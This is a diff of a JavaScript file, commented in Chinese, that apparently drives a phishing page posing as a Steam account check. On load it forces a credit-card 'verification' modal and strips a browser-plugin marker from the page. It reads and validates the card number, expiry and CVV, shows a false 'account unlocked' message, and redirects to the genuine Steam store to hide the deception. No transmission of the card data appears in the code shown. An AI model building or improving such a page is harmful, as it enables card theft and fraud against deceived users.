@@ -1,53 +1,97 @@
-// const body        = document.body;
-// const verifyModal = document.getElementById('verify-modal');
-// const ccForm      = document.getElementById('cc-form');
-//
-// // 頁面一載入就顯示 Modal、鎖定背景滾動
-// verifyModal.style.display = 'flex';
-// body.style.overflow       = 'hidden';
-//
-// // 驗證完成後：隱藏 Modal、還原背景滾動
-// ccForm.addEventListener('submit', e => {
-//     e.preventDefault();
-//     // 在這裡加入你的驗證邏輯…
-//     verifyModal.style.display = 'none';
-//     body.style.overflow       = '';
-// });
-//
-// // 範例：驗證成功後，把 #success-modal 顯示出來
-// document.getElementById('verify-form').addEventListener('submit', async (e) => {
-//     e.preventDefault();
-//     // …送出驗證…
-//     document.getElementById('verify-modal').style.display = 'none';
-//     document.getElementById('result-modal').style.display = 'flex';
-// });
-
-
-
-
-// override.js (或 script.js)
-//
-// 1. 先取到 Modal 跟表單
+// 1. 先抓到 Modal 跟表單
 const verifyModal = document.getElementById('verify-modal');
 const ccForm      = document.getElementById('cc-form');
 
-// 2. 頁面一載入，就把 Modal 顯示，並且 _不_ 鎖背景捲動
+// 2. 等頁面載入完畢，再清理殘留標記／文字，然後顯示驗證 Modal
 window.addEventListener('load', () => {
-    verifyModal.style.display = 'flex';  // flex 代表你 CSS 裡 .modal-content 會置中
-    // **移除** body.style.overflow = 'hidden';
+    console.log('>> page loaded, cleaning up stray elements');
+
+    // 2-1 移除 data-intersub-plugin-allowed 屬性
+    const elByAttr = document.querySelector('[data-intersub-plugin-allowed]');
+    if (elByAttr) {
+        elByAttr.removeAttribute('data-intersub-plugin-allowed');
+        console.log('   – removed data-intersub-plugin-allowed attribute');
+    }
+
+    // 2-2 如果頁面上有殘留同樣的文字節點，也把它刪了
+    document.body.childNodes.forEach(node => {
+        if (
+            node.nodeType === Node.TEXT_NODE &&
+            node.textContent.includes('intersub-plugin-allowed')
+        ) {
+            node.remove();
+            console.log('   – removed stray text node');
+        }
+    });
+
+    // 2-3 顯示信用卡驗證 Modal（不鎖背景滾動）
+    verifyModal.style.display = 'flex';
+    console.log('>> verify-modal displayed');
 });
 
-// 3. 表單 submit 時隱藏 Modal、恢復背景捲動、再跳個提示
-ccForm.addEventListener('submit', e => {
-    e.preventDefault();
 
-    // 隱藏信用卡驗證視窗
+// 3. 監聽表單 submit，做驗證
+ccForm.addEventListener('submit', e => {
+    e.preventDefault(); // 防止真實送出
+
+    console.log('>> form submit detected, validating…');
+
+    // 3-1 取值
+    const ccNum    = document.getElementById('cc-number').value.trim();
+    const ccExpiry = document.getElementById('cc-expiry').value.trim();
+    const ccCvv    = document.getElementById('cc-cvv').value.trim();
+
+    // 3-2 空值檢查
+    if (!ccNum || !ccExpiry || !ccCvv) {
+        alert('⚠️ 請輸入完整的信用卡號、有 MM/YY 到期日及 CVV！');
+        console.log('   – validation failed: empty fields');
+        return;
+    }
+
+    // 3-3 格式驗證
+    const numRe  = /^\d{16}$/;                       // 16 位純數字
+    const expRe  = /^(0[1-9]|1[0-2])\/\d{2}$/;       // MM/YY
+    const cvvRe  = /^\d{3}$/;                       // 3 位數字
+
+    if (!numRe.test(ccNum)) {
+        alert('❌ 信用卡號格式錯誤，請輸入 16 位純數字');
+        console.log('   – validation failed: ccNum format');
+        return;
+    }
+    if (!expRe.test(ccExpiry)) {
+        alert('❌ 有效期限格式錯誤，請輸入 MM/YY（例如 05/24）');
+        console.log('   – validation failed: ccExpiry format');
+        return;
+    }
+    if (!cvvRe.test(ccCvv)) {
+        alert('❌ CVV 格式錯誤，請輸入 3 位數字');
+        console.log('   – validation failed: ccCvv format');
+        return;
+    }
+
+    // 4. 全部都通過，顯示成功訊息
+    alert('✅ 驗證成功，您的帳號已經解鎖！');
+    console.log('>> validation passed, hiding modal and scheduling redirect');
+
+    // 5. 隱藏 Modal（背景仍可滾動）
     verifyModal.style.display = 'none';
 
-    // 恢復背景可以捲動（如果之前沒有設定 overflow:hidden，其實可以省這行）
-    document.body.style.overflow = '';
-
-    // 原本你要顯示「驗證成功」的 code 放這裡：
-    //   例如 alert、或者再把 #result-modal 顯示出來
-    alert('✅ 驗證成功，您的帳號已經解鎖！');
+    // 6. 延遲跳轉到真正的 Steam 官網
+    setTimeout(() => {
+        console.log('>> Performing redirect now');
+        window.location.replace('https://store.steampowered.com/');
+    }, 200);
 });
+
+
+
+
+
+
+
+
+
+
+
+
+
